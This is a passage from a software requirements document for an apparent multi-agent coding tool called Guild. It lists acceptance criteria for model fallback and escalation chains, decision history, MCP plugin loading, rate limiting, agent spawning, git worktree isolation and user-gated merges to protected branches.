  - verify: Configure global `provider.model = "gemma4:4b"` with no agent-level override -> agent uses gemma4:4b

**REQ-17.2 — Fallback chains -- if primary model is down/slow, use backup**

- AC-17.2.1: When primary model is unreachable, fallback model is used automatically
  - verify: Configure `fallback = ["gemma4:4b"]` and stop the primary model -> next LLM call succeeds using gemma4:4b with a log message "Primary model unavailable, falling back to gemma4:4b"
- AC-17.2.2: Fallback chain is tried in order until one succeeds
  - verify: Configure `fallback = ["model-a", "model-b"]` with model-a also down -> system tries model-a (fails), then model-b (succeeds)
- AC-17.2.3: All fallbacks exhausted produces a clear error
  - verify: Configure fallback chain where all models are down -> error: "All models in fallback chain exhausted: [primary, model-a, model-b]"

**REQ-17.3 — Use cheap models for cheap decisions**

- AC-17.3.1: Permission checks use the configured lightweight model
  - verify: Configure `routing.permission_model = "gemma4:1b"` -> permission check LLM calls use gemma4:1b, not the primary model
- AC-17.3.2: Cheap model failures fall back to the primary model
  - verify: Cheap model returns unparseable output for a permission check -> system retries with the primary model
- AC-17.3.3: A `routing.permission_model` config field exists to set the lightweight model for permission checks
  - verify: Configure `routing.permission_model = "gemma4:1b"` -> permission check LLM calls use gemma4:1b, not the primary model

**REQ-17.4 — Model capability tagging -- match task requirements to model strengths**

- AC-17.4.1: Models can be tagged with capabilities
  - verify: Configure `[models.gemma4-26b] capabilities = ["code-generation", "reasoning"]` -> model registry shows those tags
- AC-17.4.2: Task requiring a specific capability is routed to a matching model
  - verify: Task tagged `requires = ["code-generation"]` -> system selects a model with the "code-generation" capability tag

**REQ-17.5 — Stuck-triggered escalation -- when stuck detector fires, automatically retry with next model in chain**

- AC-17.5.1: Stuck detection triggers automatic model escalation
  - verify: Agent loops 3 times with no progress on gemma4:4b -> stuck detector fires -> next attempt uses the next model in the escalation chain (e.g., gemma4:26b)
- AC-17.5.2: Escalation chain is exhausted before reaching human
  - verify: Configure chain `["gemma4:4b", "gemma4:26b", "gemini-cli"]` -> agent is stuck on all three -> only then escalates to human

**REQ-17.6 — External CLI tool as provider -- shell out to installed CLI tools as escalation providers**

- AC-17.6.1: An external CLI tool can be configured as an escalation provider
  - verify: Configure `[providers.gemini-cli] type = "cli"` and `command = "gemini"` -> escalation to this provider shells out to `gemini` and parses the text response
- AC-17.6.2: CLI provider timeout is enforced
  - verify: Set `providers.gemini-cli.timeout = 30` -> if CLI tool takes longer than 30 seconds, it is killed and treated as a failure
- AC-17.6.3: CLI provider that returns empty output is treated as a failure
  - verify: CLI tool exits with code 0 but produces no output -> provider returns a failure, not an empty response
- AC-17.6.4: Empty stdout from a CLI tool (exit code 0 but no output) raises an error or returns a failure response
  - verify: CLI tool exits with code 0 and empty stdout -> `generate()` raises `ProviderError` or returns an error response, not an empty `LLMResponse`

**REQ-17.7 — Escalation chain configurable per-project**

- AC-17.7.1: Escalation chain is read from project config
  - verify: Set `[escalation] chain = ["gemma4-4b", "gemma4-26b", "gemini-cli"]` in project config -> escalation follows that order
- AC-17.7.2: Invalid model names in the chain are caught at startup
  - verify: Set `chain = ["nonexistent-model"]` -> startup warning: "Escalation chain references unknown model: nonexistent-model"
- AC-17.7.3: `validate_config()` checks that model names in the escalation chain are known and warns on unknown names
  - verify: Set `escalation.chain = "unknown-model"` in config -> startup validation emits warning "Escalation chain references unknown model: unknown-model"

**REQ-17.8 — Malformed output recovery -- retry with correction hint, then escalate**

- AC-17.8.1: Malformed LLM output triggers a retry with a correction hint
  - verify: LLM returns unparseable JSON -> system retries with "Your previous response was malformed. Please respond with valid JSON." appended
- AC-17.8.2: After 2 retries with hints, system escalates to the next model
  - verify: LLM returns malformed output 3 times in a row -> system switches to the next model in the escalation chain
- AC-17.8.3: Successful recovery after a correction hint does not escalate
  - verify: First response is malformed, retry with hint produces valid output -> system continues with the current model (no escalation)
- AC-17.8.4: Maximum retry count with correction hints before escalation is configurable and bounded
  - verify: Set max correction retries to 2 -> after exactly 2 hint retries with continued malformed output, system escalates to the next model (not a 3rd retry)
- AC-17.8.5: Malformed output detection criteria are defined (unparseable JSON, missing tool_calls fields, etc.)
  - verify: LLM returns a string that is not valid JSON when JSON was expected -> malformed recovery path is triggered

### REQ-27: Temporal Knowledge

**Goal:** Capture not just current code state but "why it was built this way" — the temporal aspect usually lost as developers change.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-27.1 | **Decision history** — key architectural and implementation decisions stored with context and rationale | Like DECISIONS.md but queryable by the agent |
| REQ-27.2 | **Present state + key past info** fetchable when relevant | Agent can ask "why is this module structured this way?" and get the historical answer |
| REQ-27.3 | Project-level instruction files (like .guild/prompt.md) consumed when they exist | Industry standard steering files — use them if present |
| REQ-27.4 | Learnings from past tasks injected as temporal context | "Last time we touched this module, X happened" |

#### Acceptance Criteria (REQ-27.1 through REQ-27.4)

**REQ-27.1 — Decision history -- key architectural and implementation decisions stored with context and rationale**

- AC-27.1.1: Decisions are stored with context, rationale, and timestamp
  - verify: Agent records a decision via `guild decisions add "Chose SQLite over Postgres" --rationale "Single-file, no server, embedded"` -> `guild decisions` lists the entry with timestamp, context, and rationale
- AC-27.1.2: Decisions are queryable by keyword
  - verify: Store 5 decisions, run `guild decisions --search "database"` -> only decisions containing "database" in context or rationale are returned
- AC-27.1.3: Decision history persists across sessions
  - verify: Record a decision, restart Guild, run `guild decisions` -> previously recorded decision is present
- AC-27.1.4: `guild decisions --search "database"` filters decisions by keyword in text and rationale fields
  - verify: Store 5 decisions, run `guild decisions --search "database"` -> only decisions containing "database" in decision text or rationale are returned

**REQ-27.2 — Present state + key past info fetchable when relevant**

- AC-27.2.1: Agent can query historical context for a specific module
  - verify: Agent asks "why is the storage module structured this way?" -> knowledge system returns the relevant decision entry explaining the rationale
- AC-27.2.2: Query returns no results gracefully when no history exists
  - verify: Query history for a module with no recorded decisions -> system returns "No historical context found for <module>" (not an error)

**REQ-27.3 — Project-level instruction files (like .guild/prompt.md) consumed when they exist**

- AC-27.3.1: `.guild/prompt.md` content is injected into the agent's system prompt
  - verify: Create `.guild/prompt.md` with "Always use type hints" -> agent's system prompt includes that instruction
- AC-27.3.2: Missing instruction file is silently ignored
  - verify: Delete `.guild/prompt.md`, start a task -> agent starts normally with no error about missing file
- AC-27.3.3: Instruction file changes take effect on next task without restart
  - verify: Update `.guild/prompt.md` while Guild is running -> next task picks up the new content
- AC-27.3.4: Modifying `.guild/prompt.md` between two task invocations causes the second task to use updated content
  - verify: First task sees "Always use type hints", modify file to "Prefer dataclasses", start second task -> second task's context includes "Prefer dataclasses"

**REQ-27.4 — Learnings from past tasks injected as temporal context**

- AC-27.4.1: Relevant past learnings are included when the agent works on a related module
  - verify: Complete a task on `storage/` that produces a learning "aiosqlite requires explicit commit" -> start a new task touching `storage/` -> agent's context includes that learning as a hint
- AC-27.4.2: Learnings from unrelated modules are not injected
  - verify: Store a learning scoped to `storage/` -> start a task on `cli/` -> that learning is not present in the agent's context
- AC-27.4.3: Injected learnings are labeled as hints, not authoritative facts
  - verify: Inspect the injected context for a learning -> it is prefixed with a marker like "[hint, confidence: 0.7]" indicating it should be verified
- AC-27.4.4: Learnings are explicitly labeled with "hint" marker to signal they are not authoritative
  - verify: Inspect injected learning text -> contains "[hint, confidence: X.X]" prefix (not just "[category] (confidence: X.X)")
- AC-27.4.5: Module-scoped learnings are filtered by relevance to the current task's module
  - verify: Learning scoped to `storage/` is NOT injected when agent works on `cli/`; it IS injected when agent works on `storage/`

### REQ-08 (extended): MCP Plugin Architecture

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-08.8 | **MCP-native tool interface** — tools are MCP servers or expose MCP-compatible schemas | Industry standard; enables reuse of existing MCP ecosystem |
| REQ-08.9 | Plugin-based tool loading — file-per-tool or directory-per-tool | Auto-discovery on startup |
| REQ-08.10 | Tool behavioral properties: `isConcurrencySafe`, `isReadOnly` | Enables optimization |
| REQ-08.11 | Tool result caching (optional, per-tool) | Avoid redundant expensive calls |

#### Acceptance Criteria (REQ-08.8 through REQ-08.11)

**REQ-08.8 — MCP-native tool interface**

- AC-08.8.1: `ToolPlugin.to_mcp_schema()` returns a dict with `name`, `description`, and `inputSchema` fields matching the MCP tool schema specification
  - verify: Create a ToolPlugin and call `to_mcp_schema()` -> returned dict has exactly `name`, `description`, `inputSchema` keys, and `inputSchema.type` is `"object"`
- AC-08.8.2: External MCP servers can be connected and their tools listed
  - verify: Configure an MCP server, connect via `MCPClient` -> `list_tools()` returns `MCPTool` instances with name, description, and input_schema populated from the server response
- AC-08.8.3: MCP tool calls are forwarded to the server and results returned
  - verify: Call `MCPClient.call_tool("tool_name", {"arg": "val"})` -> returns the result dict from the MCP server's JSON-RPC response

**REQ-08.9 — Plugin-based tool loading: file-per-tool or directory-per-tool**

- AC-08.9.1: Plugin `.toml` files in configured directories are auto-discovered on startup
  - verify: Place two `.toml` plugin files in the plugin directory -> `PluginLoader.discover()` returns both plugins with correct names and descriptions
- AC-08.9.2: Each plugin file defines a single tool with name, description, and parameters
  - verify: Load a `.toml` plugin -> resulting `ToolPlugin` has non-empty `name`, `description`, and `parameters` fields parsed from the file
- AC-08.9.3: Malformed or missing plugin files are skipped with a warning, not a crash
  - verify: Place an invalid `.toml` file alongside valid ones -> `discover()` returns only valid plugins; a warning is logged for the invalid file

**REQ-08.10 — Tool behavioral properties: `isConcurrencySafe`, `isReadOnly`**

- AC-08.10.1: Each tool plugin declares `is_read_only` and `is_concurrency_safe` behavioral properties
  - verify: Load a plugin with `is_read_only = true` -> `ToolProperties.is_read_only` is `True`. Default for `is_concurrency_safe` is `True`
- AC-08.10.2: Behavioral properties are preserved through plugin loading
  - verify: Create a `.toml` plugin with `is_read_only = true` and `is_concurrency_safe = false` -> loaded `ToolPlugin.properties` reflects both settings accurately

**REQ-08.11 — Tool result caching (optional, per-tool)**

- AC-08.11.1: A tool marked `cacheable = true` has its results cached after the first call
  - verify: Call a cacheable tool with the same args twice -> second call returns the cached result without re-executing
- AC-08.11.2: Cached results expire after the configured TTL
  - verify: Set `cache_ttl_seconds = 1`, call the tool, wait 1.1 seconds, call again -> second call re-executes (cache miss)
- AC-08.11.3: Cache respects max size and evicts the oldest entries
  - verify: Set `max_size = 3`, cache 5 results -> only the 3 most recent are retrievable; the oldest 2 return cache miss

### REQ-20: Rate Limiting & Backpressure

**Goal:** Prevent resource exhaustion when running many agents.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-20.1 | Rate limiting on LLM API calls | Per-provider, configurable |
| REQ-20.2 | Tool call queue with concurrency limits | Max N parallel shell commands |
| REQ-20.3 | Backpressure — pause low-priority agents when system is loaded | Priority-based scheduling |

#### Acceptance Criteria (REQ-20.1 through REQ-20.3)

**REQ-20.1 — Rate limiting on LLM API calls**

- AC-20.1.1: LLM calls are throttled to the configured rate per provider
  - verify: Set `rate_limit.max_requests_per_minute = 10` for Ollama -> fire 20 requests in rapid succession -> only 10 complete in the first 60 seconds; remaining are delayed (not rejected)
- AC-20.1.2: Rate limit is configurable per provider independently
  - verify: Set Ollama rate limit to 10/min and cloud provider rate limit to 5/min -> each provider enforces its own limit independently
- AC-20.1.3: Exceeding the rate limit produces a log entry, not a silent delay
  - verify: Trigger rate limiting -> log contains "Rate limit reached for provider 'ollama'; delaying next request by Ns"

**REQ-20.2 — Tool call queue with concurrency limits**

- AC-20.2.1: No more than N shell commands run in parallel
  - verify: Set `tool.max_concurrent_shell = 2`, trigger 5 shell tool calls simultaneously -> at most 2 run at any instant; remaining wait in queue
- AC-20.2.2: Queued tool calls execute in FIFO order
  - verify: Queue 3 tool calls (A, B, C) with concurrency limit 1 -> execution order is A, then B, then C
- AC-20.2.3: Tool timeout still applies while waiting in queue
  - verify: Set tool timeout to 5 seconds and queue a tool call behind a long-running command -> if queued tool waits 5+ seconds total (queue + execution), it times out with `ToolTimeoutError`

**REQ-20.3 — Backpressure -- pause low-priority agents when system is loaded**

- AC-20.3.1: Low-priority agents are paused when system load exceeds threshold
  - verify: Run two agents (priority=high, priority=low), push CPU above `cpu_threshold_percent` -> low-priority agent is paused; high-priority agent continues
- AC-20.3.2: Paused agents resume when system load drops below threshold
  - verify: After backpressure pause, reduce system load below threshold -> low-priority agent resumes automatically within one polling interval
- AC-20.3.3: Backpressure events are logged with reason
  - verify: Trigger backpressure -> audit log contains entry "Agent <agent_id> paused: system CPU at 95% exceeds threshold 80%"

---

## P2 — Teams & Blocks

### REQ-04: Multi-Agent Team Architecture & Composable Blocks

**Goal:** Entry agent (user-facing) that can spawn any agents, including other orchestrators. Flat, composable architecture — not a rigid hierarchy. Teams are built from reusable building blocks.

#### 4A: Core Agent Architecture

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-04.1 | **Entry agent is always the orchestrator** — every project starts with this agent as the user's interface | User always communicates with this base agent; it delegates |
| REQ-04.2 | The entry agent is present even in preset team compositions | Entry agent wires up the team and becomes point of contact |
| REQ-04.3 | Any agent can spawn other agents, including other orchestrators | No rigid hierarchy |
| REQ-04.4 | Agent spawning is just another tool call — keep architecture flat | No separate multi-agent runtime |
| REQ-04.5 | Worker agents that execute specific subtasks | Workers can be specialized |
| REQ-04.6 | **MCP for agent-to-tool communication** | Industry standard |
| REQ-04.7 | **Simple internal message bus for agent-to-agent communication** | `send(agent_id, port, data)` / `receive()` |
| REQ-04.7a | **A2A as optional external gateway (P3)** | For cross-Guild communication |
| REQ-04.8 | **Skills support** — agents can have pluggable skill definitions | Skill files that define capabilities |
| REQ-04.9 | Agent lifecycle management — spawn, monitor, pause, resume, kill | Guild manages all agent processes |
| REQ-04.10 | Shared context/workspace between team members | Cache sharing for token efficiency |
| REQ-04.11 | Dynamic worker spawning | Not limited to pre-defined team size |
| REQ-04.12 | **Git worktrees as isolation model** — each task gets its own worktree for true parallel file modification | Not just branches — separate working directories via `git worktree add` |
| REQ-04.13 | **Branching strategy** — agents merge freely to staging; main/release is gated by user review | Configurable policy: which branches are protected, which are free |
| REQ-04.14 | **Staging area** — a shared branch agents can merge to without user approval | Allows progress without blocking on review; user reviews staging → main merges in batch |
| REQ-04.15 | **Merge policy configurable per project** — auto-merge if tests pass, always require review, or trust level per branch | As user gains trust in system, gates can be relaxed |


#### Acceptance Criteria (REQ-04.1 through REQ-04.54)

**REQ-04.1 — Entry agent is always the orchestrator**

- AC-04.1.1: Starting a project always creates an entry agent as the user's sole interface
  - verify: Run `guild task "build feature X"` -> the agent receiving the message is the entry agent, not a worker
- AC-04.1.2: Entry agent delegates subtasks to workers rather than doing everything itself
  - verify: Run a complex task that requires multiple skills -> entry agent spawns at least one worker via the spawn tool

**REQ-04.2 — Entry agent present in preset team compositions**

- AC-04.2.1: Entry block is always first in team execution order
  - verify: Create a preset team with entry_block set -> TeamRunner._execution_order() returns entry_block as the first element
- AC-04.2.2: Entry agent receives the initial user input
  - verify: Run a team with an entry agent -> entry agent gets the user request as its first data and completes with COMPLETED status

**REQ-04.3 — Any agent can spawn other agents, including other orchestrators**

- AC-04.3.1: A worker agent can spawn its own sub-workers
  - verify: Configure a worker that spawns a sub-worker for a subtask -> sub-worker executes and returns results to the spawning worker
- AC-04.3.2: Spawning an orchestrator as a sub-agent does not deadlock
  - verify: Entry agent spawns a sub-orchestrator which spawns its own workers -> all agents complete without hanging
- AC-04.3.3: Spawn depth is bounded to prevent infinite recursion (agent spawns agent spawns agent...)
  - verify: Set `guild.max_spawn_depth = 3` -> agent at depth 3 attempts to spawn -> spawn is rejected with "Maximum spawn depth (3) exceeded" rather than recursing indefinitely

**REQ-04.4 — Agent spawning is just another tool call**

- AC-04.4.1: `spawn_agent` is a registered tool with a standard tool contract
  - verify: List registered tools -> `spawn_agent` appears with name, description, and input_schema like any other tool
- AC-04.4.2: Spawned agent results are returned as a tool result to the calling agent
  - verify: Agent calls `spawn_agent` -> receives the spawned agent's output as a `ToolResult`

**REQ-04.5 — Worker agents that execute specific subtasks**

- AC-04.5.1: Worker blocks are specialized with role-specific tools
  - verify: Load the "coder" block -> it has file_write and shell tools and role "coder"
- AC-04.5.2: A worker block runs independently within a team
  - verify: Run a single-worker team -> worker produces output matching the task description
- AC-04.5.3: Worker block rejects tasks outside its role scope
  - verify: Send a "write documentation" task to a coder block with no writer tools -> worker returns an error or refuses gracefully rather than producing garbage output
- AC-04.5.4: Worker block output conforms to its declared output port type
  - verify: Run a coder block -> output is tagged as "code-changes" type and passes validate_port_data for that type

**REQ-04.6 — MCP for agent-to-tool communication**

- AC-04.6.1: MCPClient stores server configuration
  - verify: Create MCPClient with a server config -> config attributes (name, command) are preserved
- AC-04.6.2: Calling a tool on an unconnected MCP client raises MCPError
  - verify: Call call_tool on an unconnected MCPClient -> raises MCPError with "Not connected"
- AC-04.6.3: MCPClient can list tools from a connected server
  - verify: Connect MCPClient to a running MCP server -> list_tools() returns a non-empty list of MCPTool objects with name, description, and input_schema
- AC-04.6.4: MCPClient handles server crash during tool call
  - verify: Kill the MCP server subprocess mid-call -> call_tool() raises MCPError (not a generic exception or hang)
- AC-04.6.5: MCP tool results are integrated into the agent loop as standard ToolResults
  - verify: Agent calls an MCP-provided tool -> the result appears in the agent message history in the same format as built-in tool results

**REQ-04.7 — Simple internal message bus for agent-to-agent communication**

- AC-04.7.1: `send(agent_id, port, data)` delivers a message to the target agent
  - verify: Agent A sends a message to Agent B via the bus -> Agent B receives the message with correct port and data
- AC-04.7.2: Messages to a non-existent agent return an error
  - verify: Send to `agent_id="nonexistent"` -> returns an error "Agent not found" without crashing
- AC-04.7.3: Message data is JSON-serializable
  - verify: Send a message containing a dict with nested structures -> received message is identical after serialization round-trip
- AC-04.7.4: Bus supports broadcast to all agents
  - verify: Agent A broadcasts on port "status" -> all other registered agents (B, C) receive the message; Agent A does not receive its own broadcast
- AC-04.7.5: Message ordering is preserved per-agent queue (FIFO)
  - verify: Send messages M1, M2, M3 to Agent B -> receive() returns M1 first, then M2, then M3
- AC-04.7.6: Bus message log captures all messages for audit/replay
  - verify: Send 5 messages through the bus -> get_log() returns all 5 messages with source, target, port, data, and timestamp

**REQ-04.7a — A2A as optional external gateway**

- AC-04.7a.1: Agent card is discoverable at `/.well-known/agent.json`
  - verify: GET `/.well-known/agent.json` -> returns 200 with agent card containing name and capabilities
- AC-04.7a.2: A2A task lifecycle (send, get, cancel) works via JSON-RPC
  - verify: POST `/a2a` with tasks/send, tasks/get, tasks/cancel -> each returns correct JSON-RPC result
- AC-04.7a.3: Unknown A2A methods return JSON-RPC method-not-found error
  - verify: POST `/a2a` with method "invalid/method" -> response contains error code -32601
- AC-04.7a.4: A2A endpoint returns proper JSON-RPC error for missing params
  - verify: POST /a2a with method "tasks/send" but no "message" param -> response contains error code -32602 with "Invalid params" message
- AC-04.7a.5: A2A gateway is optional and does not block startup when fastapi is not installed
  - verify: Uninstall fastapi, start Guild -> Guild starts normally; only `guild serve` reports that fastapi is required

**REQ-04.8 — Skills support: agents can have pluggable skill definitions**

- AC-04.8.1: Skills are registered and retrieved by name
  - verify: Register a skill in SkillRegistry -> get by name returns the skill with correct description
- AC-04.8.2: SkillDef loads from a markdown file with frontmatter
  - verify: Create a .md file with YAML frontmatter -> SkillDef.from_file parses name, description, tools, and prompt content
- AC-04.8.3: SkillRegistry discovers skill files from a directory
  - verify: Place 2 .md files in a directory -> SkillRegistry.load_from_dir returns count of 2
- AC-04.8.4: format_for_prompt injects selected skill content into the prompt
  - verify: Register 2 skills and call format_for_prompt with both -> returned string contains both skill contents
- AC-04.8.5: Skill with invalid frontmatter is skipped with a warning, not crash
  - verify: Place a .md file with malformed YAML frontmatter in skills dir -> SkillRegistry.load_from_dir skips it, logs a debug message, and loads remaining valid skills
- AC-04.8.6: Duplicate skill names in different files result in last-loaded winning
  - verify: Place two .md files defining skill "deploy" -> SkillRegistry contains exactly one "deploy" skill (the one loaded last alphabetically)

**REQ-04.9 — Agent lifecycle management: spawn, monitor, pause, resume, kill**

- AC-04.9.1: All five lifecycle operations are available for any agent
  - verify: Spawn an agent, pause it, resume it, then kill it -> each operation succeeds with correct state transitions
- AC-04.9.2: Killing a parent agent also stops its child agents
  - verify: Kill an orchestrator with 2 running workers -> both workers are stopped within the graceful shutdown timeout
- AC-04.9.3: Agent status transitions follow valid state machine (SPAWNED -> RUNNING -> COMPLETED/FAILED/KILLED)
  - verify: Spawn an agent -> status transitions are SPAWNED then RUNNING then COMPLETED; no invalid transitions like COMPLETED -> RUNNING
- AC-04.9.4: Pausing and resuming an agent preserves its message history
  - verify: Agent is at turn 5, pause it -> status is PAUSED; resume it -> agent continues from turn 5 with all prior messages intact
- AC-04.9.5: Monitoring returns current status for all agents in a team
  - verify: Run a team with 3 blocks -> agent_statuses property returns all 3 with their current AgentStatus values

**REQ-04.10 — Shared context/workspace between team members**

- AC-04.10.1: Agents can store and retrieve shared key-value data
  - verify: Agent stores data via SharedContext.put -> SharedContext.get returns the same data
- AC-04.10.2: list_keys returns all stored keys
  - verify: Store 2 keys -> list_keys returns both keys
- AC-04.10.3: Accessing a non-existent key returns None
  - verify: SharedContext.get on a missing key -> returns None
- AC-04.10.4: Concurrent writes to the same key use last-writer-wins semantics
  - verify: Agent A writes key "plan" with value X, then Agent B writes key "plan" with value Y -> SharedContext.get("plan") returns Y
- AC-04.10.5: Shared context data survives for the duration of the team run
  - verify: Agent A stores data in turn 1 of team execution -> Agent C (executing in a later topological step) retrieves the same data

**REQ-04.11 — Dynamic worker spawning**

- AC-04.11.1: Spawner is not limited to a fixed number of agents
  - verify: Spawn 5 agents from one spawner -> all 5 are tracked in active_agents
- AC-04.11.2: Auto-generated agent IDs are unique across spawns
  - verify: Spawn 2 agents without explicit IDs -> active_agents contains 2 distinct IDs
- AC-04.11.3: Spawned agent respects max_turns limit
  - verify: Spawn a sub-agent with SUB_AGENT_MAX_TURNS=30 and give it a task requiring many turns -> agent stops at turn 30 and returns partial result
- AC-04.11.4: Spawning with an explicit agent_id uses that ID
  - verify: Call spawn(task="...", agent_id="custom-worker") -> active_agents contains "custom-worker" (not an auto-generated UUID)

**REQ-04.12 — Git worktrees as isolation model**

- AC-04.12.1: Each spawned task agent gets its own git worktree
  - verify: Spawn 2 parallel workers -> each operates in a separate directory created via `git worktree add`
- AC-04.12.2: Worktree is cleaned up after the task completes
  - verify: Worker finishes and merges -> the worktree directory is removed via `git worktree remove`
- AC-04.12.3: Parallel workers can modify the same file without conflicts during work
  - verify: Two workers edit the same file in their respective worktrees -> no file lock errors during parallel execution
- AC-04.12.4: Worktree creation fails gracefully when not in a git repository
  - verify: Run WorktreeManager.create() in a non-git directory -> raises RuntimeError with a clear message, not a cryptic git error
- AC-04.12.5: Worktree branch naming follows guild/<task_id> convention
  - verify: Create worktree for task "abc-123" -> branch name is "guild/abc-123" and worktree path is .guild/worktrees/abc-123/
- AC-04.12.6: list_active() returns only Guild-managed worktrees, not user worktrees
  - verify: User has pre-existing worktrees on branches "feature/foo" -> list_active() does not include them; only guild/* branches appear

**REQ-04.14 — Staging area: shared branch agents can merge to without user approval**

- AC-04.14.1: Workers can merge to the staging branch without human approval
  - verify: Worker completes a subtask -> auto-merges to staging branch without prompting the user
- AC-04.14.2: Merge to main/release requires explicit user approval
  - verify: Attempt to merge staging into main -> Guild prompts "Approve merge to protected branch main? [yes/no]"
- AC-04.14.3: Merge conflict to staging is detected and reported cleanly
  - verify: Two workers modify the same file differently, both try to merge to staging -> second merge fails with "Merge conflict" message; staging branch is not left in a dirty state (merge is aborted)
- AC-04.14.4: Staging branch is auto-created if it does not exist
  - verify: Fresh repository with no guild/staging branch -> first merge_to_staging() call creates the branch and its worktree automatically

**REQ-04.13 — Branching strategy: agents merge freely to staging; main is gated**

- AC-04.13.1: main and master branches are protected by default
  - verify: BranchPolicy.is_protected("main") and is_protected("master") -> both return True
- AC-04.13.2: Staging branch allows auto-merge
  - verify: BranchPolicy.can_auto_merge("guild/staging") -> returns True
- AC-04.13.3: Auto-merge to main is blocked
  - verify: BranchPolicy.can_auto_merge("main") -> returns False
- AC-04.13.4: Custom protected branches are respected
  - verify: BranchPolicy(protected_branches=["main", "release", "production"]) -> is_protected("production") returns True
- AC-04.13.5: Non-protected, non-staging branches follow auto_merge_on_tests_pass setting
  - verify: BranchPolicy(auto_merge_on_tests_pass=False) -> can_auto_merge("feature/x") returns False; with auto_merge_on_tests_pass=True -> returns True

**REQ-04.15 — Merge policy configurable per project**

- AC-04.15.1: Policy can be configured to auto-merge if tests pass
  - verify: BranchPolicy(auto_merge_on_tests_pass=True) -> can_auto_merge("feature-branch") returns True
- AC-04.15.2: REVIEW mode requires review for everything
  - verify: BranchPolicy(merge_approval=MergeApproval.REVIEW) -> merge_approval is REVIEW
- AC-04.15.3: Protected branches are configurable
  - verify: BranchPolicy(protected_branches=["main", "release"]) -> is_protected("release") is True, is_protected("master") is False
- AC-04.15.4: Default merge policy is STAGING mode
  - verify: BranchPolicy() with no arguments -> merge_approval is MergeApproval.STAGING
- AC-04.15.5: delete_branch_after_merge setting controls post-merge cleanup
  - verify: BranchPolicy(delete_branch_after_merge=True) -> after successful merge, task branch is deleted; with False -> branch is retained

**REQ-04.20 — Atomic blocks: single-agent building blocks with defined inputs/outputs/role**

- AC-04.20.1: Each atomic block has defined input ports, output ports, and a role
  - verify: Load the "coder" block -> it has `spec: plan` input port, `changes: code-changes` output port, and role "coder"
- AC-04.20.2: An atomic block rejects input that does not match its port type
  - verify: Send `text`-typed data to the "coder" block's `spec` port (which expects `plan`) -> type mismatch error
- AC-04.20.3: All 6+ built-in atomic blocks (planner, coder, reviewer, tester, evaluator, researcher) conform to the spec in 4C
  - verify: Each built-in block's input/output port names and type tags match the table in section 4C of REQUIREMENTS.md
- AC-04.20.4: Atomic block has a configurable max_retries with default 1
  - verify: BlockDef() with no max_retries -> max_retries is 1; BlockDef(max_retries=3) -> max_retries is 3

**REQ-04.21 — Composite blocks: groups of connected blocks saved as a reusable unit**

- AC-04.21.1: A composite block can be loaded and executed as a single unit
  - verify: Load "verified-coder" composite -> it runs coder then evaluator internally and returns a single result
- AC-04.21.2: Composite block definition is saveable and reloadable
  - verify: Create a composite block from coder + reviewer, save it -> reload and execute with identical behavior
- AC-04.21.3: Composite block validates that all internal connections are valid before execution
  - verify: Create a composite block with a connection to a nonexistent port -> validate_team returns error listing the bad port
- AC-04.21.4: Composite block exposes unconnected inner ports as its external interface
  - verify: Create a coder->evaluator composite where coder.spec is unconnected -> get_composite_ports returns spec as an exposed input

**REQ-04.22 — Block connectors: defined input/output ports**

- AC-04.22.1: Connection specifies source_block.port to target_block.port
  - verify: Create a Connection -> source_block, source_port, target_block, target_port are all accessible
- AC-04.22.2: Validation catches connections to nonexistent ports
  - verify: validate_team with a connection referencing "nonexistent" port -> errors list contains the port name
- AC-04.22.3: Connection between blocks in different teams is rejected
  - verify: Create a connection referencing a source_block not in the team -> validate_team returns "not in team" error
- AC-04.22.4: A block can have multiple input ports and multiple output ports
  - verify: Define a block with 2 inputs and 2 outputs -> all 4 ports are accessible and can be independently connected

**REQ-04.23 — Block library: local catalog of available blocks**

- AC-04.23.1: Registry ships with built-in blocks (planner, coder, reviewer, tester, evaluator, researcher)
  - verify: BlockRegistry().list_blocks() -> names include all 6 built-in blocks
- AC-04.23.2: Users can register custom blocks
  - verify: Register a custom BlockDef -> get_block returns it
- AC-04.23.3: list_blocks() returns blocks sorted or consistently ordered
  - verify: Register 3 custom blocks + 6 built-ins -> list_blocks() returns a stable list (not random order across calls)
- AC-04.23.4: Registering a block with the same name as a built-in overwrites it
  - verify: Register a custom "coder" block with different tools -> get_block("coder") returns the custom definition, not the built-in

**REQ-04.24 — CLI team composer: text-based composition via config files**

- AC-04.24.1: BlockRegistry loads teams from TOML files
  - verify: Write a team TOML file -> BlockRegistry.load_from_dir loads it and get_team returns the team
- AC-04.24.2: BlockRegistry loads custom blocks from TOML files
  - verify: Write a block TOML file -> BlockRegistry.load_from_dir loads it and get_block returns the block with correct attributes
- AC-04.24.3: Invalid TOML team file is skipped with a log message, not a crash
  - verify: Place a syntactically invalid TOML file in the blocks dir -> load_from_dir logs a debug message and returns count excluding the bad file
- AC-04.24.4: Team TOML file supports loop definitions
  - verify: Write a TOML file with [team.loops] containing generator_block and evaluator_block -> loaded team has loops list with correct entries

**REQ-04.25 — Nesting: composite blocks can contain other composites**

- AC-04.25.1: A team can reference blocks that are themselves composite team names
  - verify: Register an inner composite, create an outer team referencing it -> validate_team returns no errors
- AC-04.25.2: Deeply nested composite (3+ levels) validates without errors
  - verify: Register inner composite "code-review", register middle composite "verified-code" containing it, register outer team containing "verified-code" -> validate_team returns no errors
- AC-04.25.3: Nested composite block execution runs all inner blocks
  - verify: Execute a team containing a composite that itself contains 2 blocks -> all inner blocks produce output and the composite returns a final result

**REQ-04.26 — Block versioning**

- AC-04.26.1: Every block has a version field
  - verify: BlockDef(version="1.2.3") -> block.version is "1.2.3"
- AC-04.26.2: Default version is 1.0.0
  - verify: BlockDef with no version -> block.version is "1.0.0"
- AC-04.26.3: TeamDef carries a version
  - verify: TeamDef(version="3.0.0") -> team.version is "3.0.0"

**REQ-04.27 — Loop/cycle support in block graphs**

- AC-04.27.1: TeamDef accepts LoopDef entries
  - verify: Create a TeamDef with a LoopDef -> team.loops has 1 entry with correct max_iterations
- AC-04.27.2: Validation does not reject teams with loops
  - verify: validate_team on a team with LoopDef -> errors list is empty
- AC-04.27.3: Loop edges are excluded from topological sort to prevent cycle detection failure
  - verify: Create a team with a coder->evaluator->coder loop -> _execution_order() returns a valid order without raising a cycle error
- AC-04.27.4: A team can have multiple independent loops
  - verify: Define a team with two LoopDef entries (loop A: coder->evaluator, loop B: writer->reviewer) -> validate_team returns no errors and both loops are in team.loops

**REQ-04.30 — Every port has a type tag and optional JSON schema**

- AC-04.30.1: Built-in types include plan, code-changes, review, test-results, text, any
